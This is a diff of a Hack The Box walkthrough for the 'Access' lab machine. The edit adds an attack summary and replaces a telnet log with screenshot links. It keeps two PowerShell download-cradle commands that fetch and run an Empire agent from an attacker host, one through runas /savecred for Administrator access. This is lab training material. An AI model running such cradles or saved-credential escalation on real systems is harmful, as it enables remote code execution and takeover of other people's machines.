@@ -1,14 +1,12 @@
 # Hackthebox 
 
 
-Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.
-
 ### Attack Summary
 
-1.
-2.
-3.
-4.
+1. Anonymous FTP access
+2. Credentials in Database
+3. Saved admin credentials
+
 
 ## Recon
 
@@ -53,25 +51,14 @@ The table contains credentials for a couple of users. We can use the "access4u@s
 
 To read the file I imported it to Thunderbird and read the contents.
 
+![mail](../images/access_email.png)
+
+
 ## Initial Compromise
 
 Using the credentials from the e-mail we can log in to the system over the exposed telnet service.
 
-```
-root@kali:~/htb/access# telnet 10.10.10.98
-Trying 10.10.10.98...
-Connected to 10.10.10.98.
-Escape character is '^]'.
-Welcome to Microsoft Telnet Service 
-
-login: security
-password: 
-
-*===============================================================
-Microsoft Telnet Server.
-*===============================================================
-C:\Users\security>
-```
+![telnet](../images/access_telnet.png)
 
 ## Establish Foothold
 
@@ -82,6 +69,10 @@ So here I used a Powershell download cradle to inject an Empire agent into memor
 ```
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32:8000/empire.ps1')"
 ```
+
+
+![empire](../images/access_empire_agent.png)
+
 
 ## Host situational awareness
 
@@ -135,4 +126,6 @@ We could just as easy spawn another high integrity Empire agent with the same ru
 ```
 runas /user:ACCESS\Administrator /savecred "powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29:8000/empire.ps1')"
 ```
+
+![empire](../images/access_high_integrity_agent.png)
 
